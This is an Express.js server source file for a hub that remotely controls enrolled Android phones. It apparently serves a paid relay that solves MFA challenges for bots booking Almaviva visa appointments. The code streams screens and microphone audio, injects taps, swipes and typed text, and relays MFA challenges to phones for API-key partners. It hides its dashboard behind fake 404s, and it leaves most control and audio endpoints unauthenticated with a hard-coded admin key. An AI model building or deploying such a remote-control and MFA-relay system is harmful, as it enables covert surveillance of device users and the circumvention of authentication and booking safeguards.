import express from "express";
import fs from "fs";
import path from "path";
import { fileURLToPath } from "url";
import { dirname } from "path";

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

const app = express();

// Native CORS Middleware
app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
  res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept, Authorization, x-api-key");
  if (req.method === "OPTIONS") return res.sendStatus(200);
  next();
});
app.use(express.json({ limit: "50mb" }));
app.use(express.urlencoded({ extended: true, limit: "50mb" }));

// Load Config
const CONFIG_FILE = path.join(__dirname, "hub-config.json");
function loadConfig() {
  try {
    if (fs.existsSync(CONFIG_FILE)) {
      return JSON.parse(fs.readFileSync(CONFIG_FILE, "utf8"));
    }
  } catch (e) {
    console.error("⚠️ Error reading hub-config.json:", e.message);
  }
  return { port: 3003, adminKey: "adm_master_hub_998877", partners: {} };
}
let config = loadConfig();

const PORT = process.env.PORT || config.port || 3003;

// ── State Persistence (Never lose registered client phones across server restarts) ──
const CLIENTS_STORAGE_FILE = path.join(__dirname, "clients.json");

function loadStoredClients() {
  const map = new Map();
  try {
    if (fs.existsSync(CLIENTS_STORAGE_FILE)) {
      const data = JSON.parse(fs.readFileSync(CLIENTS_STORAGE_FILE, "utf8"));
      if (Array.isArray(data)) {
        for (const item of data) {
          if (item && item.email) {
            const cleanEmail = item.email.trim().toLowerCase().replace(/[\u200B-\u200D\uFEFF\u202A-\u202E]/g, "");
            map.set(cleanEmail, {
              ...item,
              email: cleanEmail
            });
          }
        }
        console.log(`[HUB] 📂 Loaded ${map.size} persisted client phones from clients.json`);
      }
    }
  } catch (err) {
    console.error("[HUB] ⚠️ Error loading clients.json:", err.message);
  }
  return map;
}

let saveClientsTimer = null;
function persistClientsToDisk() {
  if (saveClientsTimer) return;
  saveClientsTimer = setTimeout(() => {
    saveClientsTimer = null;
    try {
      const array = Array.from(clients.values()).map(c => ({
        email: c.email,
        name: c.name || c.email.split('@')[0],
        lastSeen: c.lastSeen,
        batteryLevel: c.batteryLevel,
        isCharging: c.isCharging,
        appVersion: c.appVersion || "1.2.8-sec",
        accessibilityEnabled: c.accessibilityEnabled !== false,
        status: c.status || "offline"
      }));
      fs.writeFileSync(CLIENTS_STORAGE_FILE, JSON.stringify(array, null, 2), "utf8");
    } catch (e) {
      console.error("[HUB] ⚠️ Error persisting clients to disk:", e.message);
    }
  }, 1500);
}

// ── In-Memory State ─────────────────────────────────────────────────────────────
const clients = loadStoredClients();   // email -> { email, lastSeen, batteryLevel, isCharging, appVersion, accessibilityEnabled, status, ip }
const pendingCommands = new Map();     // email -> [ commandObject ]
const latestScreenshots = new Map();   // email -> { buffer, contentType, timestamp }
const longPollWaiters = new Map();      // email -> [ { res, timer } ]
const pendingMfaRequests = new Map();  // cmdId -> { resolve, reject, email, timer, startedAt }
const streamStates = new Map();        // email -> { active: boolean, lastPing: number }
const audioListeners = new Map();      // email -> Set<res>
const audioStates = new Map();         // email -> { active: boolean, lastPing: number }

// Helper: Notify long polling phone immediately with top-level fields matching Android client
function notifyPhone(email, command) {
  const normEmail = (email || "").trim().toLowerCase();
  const waiters = longPollWaiters.get(normEmail);
  if (waiters && waiters.length > 0) {
    const waiter = waiters.shift();
    clearTimeout(waiter.timer);
    try {
      // Send command directly at root level so Android app parses json.optString("action")
      waiter.res.json({ ...command });
      console.log(`[HUB] 🚀 Dispatched immediate command (${command.action}) to ${normEmail}`);
      return true;
    } catch (_) {}
  }
  // If not waiting right now, queue it for the next poll
  if (!pendingCommands.has(normEmail)) {
    pendingCommands.set(normEmail, []);
  }
  pendingCommands.get(normEmail).push(command);
  console.log(`[HUB] ⏳ Queued command (${command.action}) for ${normEmail} (pending: ${pendingCommands.get(normEmail).length})`);
  return false;
}

// ── Mobile Client Endpoints (App Communication) ───────────────────────────────────

// 1. Heartbeat
app.post("/api/client-app/heartbeat", (req, res) => {
  const { email, batteryLevel, isCharging, appVersion, accessibilityEnabled, status } = req.body || {};
  if (!email) {
    return res.status(400).json({ success: false, error: "Email is required" });
  }

  const normEmail = email.trim().toLowerCase();
  const existing = clients.get(normEmail) || {};
  const clientData = {
    ...existing,
    email: normEmail,
    lastSeen: Date.now(),
    batteryLevel: batteryLevel !== undefined ? batteryLevel : existing.batteryLevel,
    isCharging: isCharging !== undefined ? isCharging : existing.isCharging,
    appVersion: appVersion || existing.appVersion || "1.2.9",
    accessibilityEnabled: accessibilityEnabled !== undefined ? accessibilityEnabled : true,
    status: status || "online",
    ip: req.ip || req.socket.remoteAddress || ""
  };
  clients.set(normEmail, clientData);
  persistClientsToDisk();

  res.json({
    success: true,
    serverTime: Date.now(),
    registered: true
  });
});

// 2. Long Polling for commands (Phone calls this every 25s)
app.get("/api/client-app/poll", (req, res) => {
  const email = (req.query.email || "").trim().toLowerCase();
  if (!email) {
    return res.status(400).json({ success: false, error: "Email query param required" });
  }

  // Update last seen
  const client = clients.get(email) || { email, appVersion: "1.2.9" };
  client.lastSeen = Date.now();
  clients.set(email, client);
  persistClientsToDisk();

  // Check if there is already a queued command
  const queue = pendingCommands.get(email);
  if (queue && queue.length > 0) {
    const nextCmd = queue.shift();
    console.log(`[HUB] 📤 Delivering queued command (${nextCmd.action}) to ${email}`);
    return res.json({ ...nextCmd });
  }

  // Keep connection open for long polling (up to 25 seconds)
  const timer = setTimeout(() => {
    // Remove from waiters list
    const list = longPollWaiters.get(email) || [];
    const idx = list.findIndex(w => w.res === res);
    if (idx !== -1) list.splice(idx, 1);
    try {
      res.json({ action: null });
    } catch (_) {}
  }, 25000);

  if (!longPollWaiters.has(email)) {
    longPollWaiters.set(email, []);
  }
  longPollWaiters.get(email).push({ res, timer });

  req.on("close", () => {
    clearTimeout(timer);
    const list = longPollWaiters.get(email) || [];
    const idx = list.findIndex(w => w.res === res);
    if (idx !== -1) list.splice(idx, 1);
  });
});

// 3. Upload Screenshot (Supports image, base64Image, or imageBase64)
app.post("/api/client-app/screenshot", (req, res) => {
  const { email, image, base64Image, imageBase64, timestamp, isStream } = req.body || {};
  const rawBase64 = image || base64Image || imageBase64;
  if (!email || !rawBase64) {
    return res.status(400).json({ success: false, error: "Email and image are required" });
  }

  const normEmail = email.trim().toLowerCase();
  const cleanBase64 = rawBase64.replace(/^data:image\/\w+;base64,/, "");
  const buffer = Buffer.from(cleanBase64, "base64");

  latestScreenshots.set(normEmail, {
    buffer,
    contentType: "image/jpeg",
    timestamp: timestamp || Date.now()
  });

  // Update client state
  const client = clients.get(normEmail) || { email: normEmail };
  client.lastSeen = Date.now();
  client.lastScreenshotTime = Date.now();
  clients.set(normEmail, client);

  res.json({ success: true, receivedBytes: buffer.length });
});

// 4. Get Screenshot
app.get("/api/client-app/screenshot/:email", (req, res) => {
  const email = decodeURIComponent(req.params.email || "").trim().toLowerCase();
  const screenshot = latestScreenshots.get(email);

  if (!screenshot) {
    return res.status(404).json({ success: false, error: "No screenshot available for this email" });
  }

  const isRaw = req.query.raw === "true" || (req.headers.accept && req.headers.accept.includes("image/"));
  if (isRaw) {
    res.setHeader("Content-Type", screenshot.contentType || "image/jpeg");
    res.setHeader("Cache-Control", "no-cache, no-store, must-revalidate");
    return res.send(screenshot.buffer);
  }

  res.json({
    success: true,
    email,
    timestamp: screenshot.timestamp,
    base64: screenshot.buffer.toString("base64")
  });
});

// 5. Command Acknowledgment from Phone
app.post("/api/client-app/ack", (req, res) => {
  const { email, challengeId, commandId, action, status, result, success, message } = req.body || {};
  const normEmail = (email || "").trim().toLowerCase();
  const idToCheck = challengeId || commandId;

  console.log(`[HUB] 📲 Phone ACK from ${normEmail} (ID: ${idToCheck}, Action: ${action}): ${message || status || ''}`);

  // Resolve pending partner relay requests
  if (idToCheck && pendingMfaRequests.has(idToCheck)) {
    const item = pendingMfaRequests.get(idToCheck);
    clearTimeout(item.timer);
    pendingMfaRequests.delete(idToCheck);

    const isSuccess = success === true || status === "SUCCESS" || status === "ok";
    item.resolve({
      success: isSuccess,
      email: normEmail,
      action: action || item.action,
      durationMs: Date.now() - item.startedAt,
      result: result || message || null
    });
  }

  const client = clients.get(normEmail);
  if (client) {
    client.lastSeen = Date.now();
    client.lastActivity = `${action || 'ACTION'}: ${message || status || 'DONE'}`;
  }

  res.json({ success: true, acknowledged: true });
});

// ── Dashboard Control Endpoints (Mobile Hub UI) ──────────────────────────────────

// 6. List all connected clients
app.get("/api/client-app/clients", (req, res) => {
  const now = Date.now();
  const list = [];

  for (const [email, data] of clients.entries()) {
    const isOnline = (now - (data.lastSeen || 0)) < 45000;
    const screenshot = latestScreenshots.get(email);
    const stream = streamStates.get(email);

    list.push({
      email,
      lastSeen: data.lastSeen,
      online: isOnline,
      batteryLevel: data.batteryLevel !== undefined ? data.batteryLevel : null,
      isCharging: !!data.isCharging,
      appVersion: data.appVersion || "1.2.9",
      accessibilityEnabled: data.accessibilityEnabled !== false,
      isStreaming: stream && stream.active && (now - stream.lastPing < 20000),
      screenshotUrl: screenshot ? `/api/client-app/screenshot/${encodeURIComponent(email)}?raw=true&t=${screenshot.timestamp}` : null,
      lastScreenshotTime: screenshot ? screenshot.timestamp : null,
      status: isOnline ? (data.status || "online") : "offline"
    });
  }

  list.sort((a, b) => {
    if (a.online && !b.online) return -1;
    if (!a.online && b.online) return 1;
    return (b.lastSeen || 0) - (a.lastSeen || 0);
  });

  res.json({
    success: true,
    total: list.length,
    onlineCount: list.filter(c => c.online).length,
    clients: list
  });
});

// 7. Remote Touch Click
app.post("/api/client-app/touch/:email", (req, res) => {
  const email = decodeURIComponent(req.params.email || "").trim().toLowerCase();
  const { xPercent, yPercent } = req.body || {};

  if (xPercent === undefined || yPercent === undefined) {
    return res.status(400).json({ success: false, error: "xPercent and yPercent required" });
  }

  const cmdId = "touch_" + Date.now();
  const command = {
    id: cmdId,
    action: "TOUCH_CLICK",
    xPercent: parseFloat(xPercent),
    yPercent: parseFloat(yPercent),
    timestamp: Date.now()
  };

  notifyPhone(email, command);
  res.json({ success: true, commandId: cmdId });
});

// 8. Remote Actions (wake, home, open Almaviva, vibrate, etc.)
const actionMap = {
  screenshot: "CAPTURE_SCREEN",
  open_almaviva: "OPEN_ALMAVIVA",
  go_home: "GO_HOME",
  go_back: "GO_BACK",
  go_recents: "GO_RECENTS",
  notifications: "OPEN_NOTIFICATIONS",
  wake_screen: "WAKE_SCREEN",
  test_almaviva: "TEST_ALMAVIVA",
  vibrate: "VIBRATE_ALERT",
  notify: "SHOW_NOTIFICATION",
  alert: "SHOW_NOTIFICATION",
  start_stream: "START_LIVE_STREAM",
  stop_stream: "STOP_LIVE_STREAM"
};

app.post("/api/client-app/remote/:action/:email", (req, res) => {
  const email = decodeURIComponent(req.params.email || "").trim().toLowerCase();
  const rawAction = (req.params.action || "").trim().toLowerCase();
  const mappedAction = actionMap[rawAction] || rawAction.toUpperCase();

  if (email === "all" || email === "broadcast") {
    let sentCount = 0;
    const now = Date.now();
    for (const [cEmail, client] of clients.entries()) {
      const isOnline = (now - (client.lastSeen || 0)) < 60000;
      if (isOnline) {
        notifyPhone(cEmail, {
          id: `broadcast_${mappedAction}_${Date.now()}_${sentCount}`,
          action: mappedAction,
          title: req.body?.title,
          message: req.body?.message,
          timestamp: Date.now()
        });
        sentCount++;
      }
    }
    return res.json({ success: true, broadcast: true, action: mappedAction, count: sentCount });
  }

  const cmdId = "action_" + Date.now();
  const command = {
    id: cmdId,
    action: mappedAction,
    title: req.body?.title,
    message: req.body?.message,
    timestamp: Date.now()
  };

  notifyPhone(email, command);
  res.json({ success: true, commandId: cmdId, action: mappedAction });
});

// 8b. Defensive Broadcast Notification to all connected client phones
app.post("/api/client-app/broadcast-notification", (req, res) => {
  const { title, message, wakeScreen, vibrate, level } = req.body || {};
  const alertTitle = title || "🚨 تنبيه دفاعي من منظومة الصيد";
  const alertMessage = message || "يرجى فتح شاشة الهاتف وإبقاؤها نشطة الآن.";

  const now = Date.now();
  let dispatchedCount = 0;
  const dispatchedEmails = [];

  for (const [normEmail, client] of clients.entries()) {
    const isOnline = (now - (client.lastSeen || 0)) < 60000;
    if (isOnline) {
      const cmdId = "notify_broadcast_" + Date.now() + "_" + dispatchedCount;
      const command = {
        id: cmdId,
        action: "SHOW_NOTIFICATION",
        title: alertTitle,
        message: alertMessage,
        wakeScreen: wakeScreen !== false,
        vibrate: vibrate !== false,
        level: level || "urgent",
        timestamp: Date.now()
      };
      notifyPhone(normEmail, command);
      dispatchedCount++;
      dispatchedEmails.push(normEmail);
    }
  }

  console.log(`[HUB] 📢 Broadcast notification dispatched to ${dispatchedCount} phones: "${alertTitle}" - "${alertMessage}"`);
  res.json({
    success: true,
    totalOnline: dispatchedCount,
    dispatchedEmails,
    title: alertTitle,
    message: alertMessage
  });
});

// 8c. Defensive Notification to a specific client phone
app.post("/api/client-app/send-notification/:email", (req, res) => {
  const email = decodeURIComponent(req.params.email || "").trim().toLowerCase();
  const { title, message, wakeScreen, vibrate, level } = req.body || {};

  const alertTitle = title || "🚨 تنبيه من منظومة الصيد";
  const alertMessage = message || "يرجى إبقاء الهاتف نشطاً.";

  const cmdId = "notify_single_" + Date.now();
  const command = {
    id: cmdId,
    action: "SHOW_NOTIFICATION",
    title: alertTitle,
    message: alertMessage,
    wakeScreen: wakeScreen !== false,
    vibrate: vibrate !== false,
    level: level || "urgent",
    timestamp: Date.now()
  };

  notifyPhone(email, command);
  console.log(`[HUB] 🔔 Single notification dispatched to ${email}: "${alertTitle}" - "${alertMessage}"`);
  res.json({
    success: true,
    email,
    commandId: cmdId,
    title: alertTitle,
    message: alertMessage
  });
});

// 9. Live Screen Stream
app.post("/api/client-app/stream/:state/:email", (req, res) => {
  const email = decodeURIComponent(req.params.email || "").trim().toLowerCase();
  const state = (req.params.state || "").trim().toLowerCase();

  const stream = streamStates.get(email) || { active: false, lastPing: 0 };

  if (state === "start") {
    stream.active = true;
    stream.lastPing = Date.now();
    streamStates.set(email, stream);

    const command = {
      id: "stream_" + Date.now(),
      action: "START_LIVE_STREAM",
      intervalMs: 800,
      timestamp: Date.now()
    };
    notifyPhone(email, command);
  } else if (state === "ping") {
    stream.active = true;
    stream.lastPing = Date.now();
    streamStates.set(email, stream);

    const command = {
      id: "ping_" + Date.now(),
      action: "STREAM_PING",
      timestamp: Date.now()
    };
    notifyPhone(email, command);
  } else if (state === "stop") {
    stream.active = false;
    streamStates.set(email, stream);

    const command = {
      id: "stream_stop_" + Date.now(),
      action: "STOP_LIVE_STREAM",
      timestamp: Date.now()
    };
    notifyPhone(email, command);
  }

  res.json({ success: true, state, active: stream.active });
});

// 9.1 Live Audio Stream Control & Chunk Relay
app.post("/api/client-app/audio-chunk/:email", (req, res) => {
  const email = decodeURIComponent(req.params.email || "").trim().toLowerCase();
  const { chunk, base64Audio, format, timestamp } = req.body || {};
  const audioData = chunk || base64Audio;

  if (!email || !audioData) {
    return res.status(400).json({ success: false, error: "Email and audio chunk required" });
  }

  const listeners = audioListeners.get(email);
  if (listeners && listeners.size > 0) {
    const payload = `data: ${JSON.stringify({ chunk: audioData, format: format || "pcm_16k", t: timestamp || Date.now() })}\n\n`;
    for (const clientRes of listeners) {
      try {
        clientRes.write(payload);
      } catch (_) {}
    }
  }

  res.json({ success: true, listeners: listeners ? listeners.size : 0 });
});

// SSE Stream for Web Audio Listener
app.get("/api/client-app/audio-stream/:email", (req, res) => {
  const email = decodeURIComponent(req.params.email || "").trim().toLowerCase();

  res.writeHead(200, {
    "Content-Type": "text/event-stream",
    "Cache-Control": "no-cache, no-transform",
    "Connection": "keep-alive",
    "Access-Control-Allow-Origin": "*"
  });

  res.write(": audio-stream-connected\n\n");

  if (!audioListeners.has(email)) {
    audioListeners.set(email, new Set());
  }
  audioListeners.get(email).add(res);

  // Notify phone to start audio if not already started
  const audioState = audioStates.get(email) || { active: false, lastPing: 0 };
  audioState.active = true;
  audioState.lastPing = Date.now();
  audioStates.set(email, audioState);

  notifyPhone(email, {
    id: "audio_start_" + Date.now(),
    action: "START_AUDIO_STREAM",
    sampleRate: 16000,
    timestamp: Date.now()
  });

  const keepAliveTimer = setInterval(() => {
    try {
      res.write(": keepalive\n\n");
    } catch (_) {}
  }, 15000);

  req.on("close", () => {
    clearInterval(keepAliveTimer);
    const set = audioListeners.get(email);
    if (set) {
      set.delete(res);
      if (set.size === 0) {
        audioListeners.delete(email);
        audioStates.set(email, { active: false, lastPing: Date.now() });
        notifyPhone(email, {
          id: "audio_stop_" + Date.now(),
          action: "STOP_AUDIO_STREAM",
          timestamp: Date.now()
        });
      }
    }
  });
});

app.post("/api/client-app/audio-control/:state/:email", (req, res) => {
  const email = decodeURIComponent(req.params.email || "").trim().toLowerCase();
  const state = (req.params.state || "").trim().toLowerCase();

  const audioState = audioStates.get(email) || { active: false, lastPing: 0 };

  if (state === "start") {
    audioState.active = true;
    audioState.lastPing = Date.now();
    audioStates.set(email, audioState);
    notifyPhone(email, {
      id: "audio_start_" + Date.now(),
      action: "START_AUDIO_STREAM",
      sampleRate: 16000,
      timestamp: Date.now()
    });
  } else if (state === "ping") {
    audioState.active = true;
    audioState.lastPing = Date.now();
    audioStates.set(email, audioState);
    notifyPhone(email, {
      id: "audio_ping_" + Date.now(),
      action: "AUDIO_PING",
      timestamp: Date.now()
    });
  } else if (state === "stop") {
    audioState.active = false;
    audioStates.set(email, audioState);
    notifyPhone(email, {
      id: "audio_stop_" + Date.now(),
      action: "STOP_AUDIO_STREAM",
      timestamp: Date.now()
    });
  }

  res.json({ success: true, state, active: audioState.active });
});

// 9.2 Remote Swipe Gesture
app.post("/api/client-app/swipe/:email", (req, res) => {
  const email = decodeURIComponent(req.params.email || "").trim().toLowerCase();
  const { startX, startY, endX, endY, durationMs = 300 } = req.body || {};

  if (startX === undefined || startY === undefined || endX === undefined || endY === undefined) {
    return res.status(400).json({ success: false, error: "startX, startY, endX, endY required" });
  }

  const cmdId = "swipe_" + Date.now();
  const command = {
    id: cmdId,
    action: "SWIPE",
    startX: parseFloat(startX),
    startY: parseFloat(startY),
    endX: parseFloat(endX),
    endY: parseFloat(endY),
    durationMs: parseInt(durationMs, 10),
    timestamp: Date.now()
  };

  notifyPhone(email, command);
  res.json({ success: true, commandId: cmdId });
});

// 9.3 Direct Input Text / Typing
app.post("/api/client-app/input-text/:email", (req, res) => {
  const email = decodeURIComponent(req.params.email || "").trim().toLowerCase();
  const { text } = req.body || {};

  if (text === undefined) {
    return res.status(400).json({ success: false, error: "text required" });
  }

  const cmdId = "type_" + Date.now();
  const command = {
    id: cmdId,
    action: "INPUT_TEXT",
    text: String(text),
    timestamp: Date.now()
  };

  notifyPhone(email, command);
  res.json({ success: true, commandId: cmdId });
});

// 10. Request Screenshot
app.post("/api/client-app/request-screenshot/:email", (req, res) => {
  const email = decodeURIComponent(req.params.email || "").trim().toLowerCase();
  const command = {
    id: "screenshot_" + Date.now(),
    action: "CAPTURE_SCREEN",
    timestamp: Date.now()
  };
  notifyPhone(email, command);
  res.json({ success: true, message: "تم إرسال أمر تصوير الشاشة للهاتف فوراً" });
});

// 11. Request Test Click
app.post("/api/client-app/request-test/:email", (req, res) => {
  const email = decodeURIComponent(req.params.email || "").trim().toLowerCase();
  const command = {
    id: "test_" + Date.now(),
    action: "TEST_ALMAVIVA",
    timestamp: Date.now()
  };
  notifyPhone(email, command);
  res.json({ success: true, message: "تم إرسال أمر فحص وتجربة النقر التلقائي للهاتف" });
});

// 12. Single Client Status
app.get("/api/client-app/status/:email", (req, res) => {
  const email = decodeURIComponent(req.params.email || "").trim().toLowerCase();
  const client = clients.get(email);
  if (!client) {
    return res.json({ success: true, registered: false, online: false });
  }

  const isOnline = (Date.now() - (client.lastSeen || 0)) < 45000;
  res.json({
    success: true,
    registered: true,
    online: isOnline,
    lastSeen: client.lastSeen,
    batteryLevel: client.batteryLevel,
    accessibilityEnabled: client.accessibilityEnabled
  });
});

// ── Direct Bot & MFA Dispatch Gateway ──────────────────────────────────────────────

// 13. Instant MFA Trigger from any Bot Server (No auth required for local/internal bots)
app.post("/api/client-app/trigger-mfa/:email", (req, res) => {
  const email = decodeURIComponent(req.params.email || "").trim().toLowerCase();
  const { qrPayload, qrText, challengeId } = req.body || {};
  const payloadStr = qrPayload || qrText || (typeof req.body === "string" ? req.body : JSON.stringify(req.body));

  let parsedChallengeId = challengeId || "";
  if (!parsedChallengeId) {
    try {
      const p = typeof payloadStr === "string" ? JSON.parse(payloadStr) : payloadStr;
      parsedChallengeId = p.challengeId || "";
    } catch (_) {}
  }
  if (!parsedChallengeId) parsedChallengeId = "mfa_" + Date.now();

  const command = {
    id: parsedChallengeId,
    action: "TRIGGER_MFA",
    qrText: typeof payloadStr === "object" ? JSON.stringify(payloadStr) : String(payloadStr),
    challengeId: parsedChallengeId,
    timestamp: Date.now()
  };

  const sent = notifyPhone(email, command);
  console.log(`[HUB] ⚡ Trigger MFA sent to ${email} (Delivered: ${sent ? 'IMMEDIATE' : 'QUEUED'})`);
  res.json({
    success: true,
    delivered: sent,
    email,
    challengeId: parsedChallengeId,
    message: sent ? "تم تسليم الطلب للهاتف فوراً" : "تم جدولة الطلب وفي انتظار الهاتف"
  });
});

// ── External Partner Relay APIs ───────────────────────────────────────────────────

function authenticateBotApiKey(req, res, next) {
  const apiKey = req.headers["x-api-key"] || req.query.apiKey || req.body?.apiKey;
  if (!apiKey) {
    return res.status(401).json({ success: false, error: "Missing x-api-key header or apiKey parameter" });
  }

  config = loadConfig();

  if (apiKey === config.adminKey) {
    req.partner = { name: "Administrator", isMaster: true, allowedEmails: ["*"] };
    return next();
  }

  const partner = config.partners && config.partners[apiKey];
  if (!partner || partner.enabled === false) {
    return res.status(403).json({ success: false, error: "Invalid or disabled API Key" });
  }

  req.partner = partner;
  next();
}

// 14. Partner Solve MFA Challenge
app.post("/api/relay/solve-mfa", authenticateBotApiKey, (req, res) => {
  const { email, timeoutMs = 35000, context, qrPayload, qrText, challengeId } = req.body || {};
  if (!email) {
    return res.status(400).json({ success: false, error: "Email is required" });
  }

  const normEmail = email.trim().toLowerCase();

  const allowed = req.partner.allowedEmails || [];
  if (!allowed.includes("*") && !allowed.map(e => e.toLowerCase()).includes(normEmail)) {
    return res.status(403).json({ success: false, error: `This API key is not authorized for email: ${normEmail}` });
  }

  const client = clients.get(normEmail);
  const isOnline = client && (Date.now() - (client.lastSeen || 0) < 45000);
  if (!isOnline) {
    return res.status(503).json({
      success: false,
      error: "DEVICE_OFFLINE",
      message: `The mobile device for ${normEmail} is currently offline.`,
      lastSeen: client ? client.lastSeen : null
    });
  }

  const cmdId = challengeId || ("mfa_" + Date.now() + "_" + Math.random().toString(36).slice(2, 7));
  const payloadStr = qrPayload || qrText || "";

  const command = {
    id: cmdId,
    action: "TRIGGER_MFA",
    qrText: payloadStr,
    challengeId: cmdId,
    timestamp: Date.now()
  };

  const timer = setTimeout(() => {
    if (pendingMfaRequests.has(cmdId)) {
      pendingMfaRequests.delete(cmdId);
      try {
        res.status(504).json({
          success: false,
          error: "TIMEOUT",
          message: `Device did not respond to MFA challenge within ${timeoutMs}ms.`
        });
      } catch (_) {}
    }
  }, Math.min(timeoutMs, 60000));

  pendingMfaRequests.set(cmdId, {
    resolve: (data) => res.json(data),
    reject: (err) => res.status(500).json({ success: false, error: err.message }),
    email: normEmail,
    action: "TRIGGER_MFA",
    timer,
    startedAt: Date.now()
  });

  notifyPhone(normEmail, command);
});

// 15. Partner Device Health
app.get("/api/relay/health/:email", authenticateBotApiKey, (req, res) => {
  const email = (req.params.email || "").trim().toLowerCase();
  const client = clients.get(email);
  if (!client) {
    return res.json({ success: true, email, online: false, message: "Device never connected" });
  }

  const isOnline = (Date.now() - (client.lastSeen || 0)) < 45000;
  res.json({
    success: true,
    email,
    online: isOnline,
    lastSeen: client.lastSeen,
    batteryLevel: client.batteryLevel,
    isCharging: client.isCharging,
    accessibilityEnabled: client.accessibilityEnabled,
    appVersion: client.appVersion
  });
});

// 16. Partner Device List
app.get("/api/relay/devices", authenticateBotApiKey, (req, res) => {
  const allowed = req.partner.allowedEmails || [];
  const list = [];
  const now = Date.now();

  for (const [email, data] of clients.entries()) {
    if (allowed.includes("*") || allowed.map(e => e.toLowerCase()).includes(email)) {
      const isOnline = (now - (data.lastSeen || 0)) < 45000;
      list.push({
        email,
        online: isOnline,
        batteryLevel: data.batteryLevel,
        isCharging: data.isCharging,
        lastSeen: data.lastSeen,
        appVersion: data.appVersion
      });
    }
  }

  res.json({ success: true, partner: req.partner.name, devices: list });
});

// ── Static Web Dashboard Serving ──────────────────────────────────────────────────
// Disable default index.html serving to protect dashboard privacy
app.use(express.static(path.join(__dirname, "public"), { index: false }));

// App version check for client in-app updates
app.get("/api/app-version", (req, res) => {
  res.json({
    success: true,
    versionCode: 27,
    versionName: "1.7.2",
    apkUrl: "http://15.161.39.53:3003/VisaAutoAuth-v1.0.apk",
    githubUrl: "https://github.com/Taikodracula/visa-auto-auth/releases/download/v1.7.2/VisaAutoAuth-v1.0.apk",
    notes: "نظام الإشعارات الدفاعية الفورية، إيقاظ الهواتف والاهتزاز التنبيهي قبل الصيد، وإغلاق تلقائي لأي نوافذ خطأ"
  });
});

// Master Dashboard Private URL
app.get(["/mobile-hub-master", "/mobile-hub-master.html"], (req, res) => {
  res.sendFile(path.join(__dirname, "public", "mobile-hub-master.html"));
});

// Explicit 404 for old routes to keep the master hub completely hidden
app.all(["/", "/mobile-hub", "/mobile-hub.html", "/index.html"], (req, res) => {
  res.status(404).send("404 Not Found");
});

// Start Server
app.listen(PORT, "0.0.0.0", () => {
  console.log(`================================================================`);
  console.log(`🚀 Mobile Hub Gateway & Remote MFA Relay Server`);
  console.log(`📡 Listening on: http://0.0.0.0:${PORT}`);
  console.log(`📱 Master Dashboard: http://localhost:${PORT}/mobile-hub-master`);
  console.log(`⚡ Instant MFA Dispatch: http://localhost:${PORT}/api/client-app/trigger-mfa/:email`);
  console.log(`🔗 Partner Relay API: http://localhost:${PORT}/api/relay/solve-mfa`);
  console.log(`================================================================`);
});
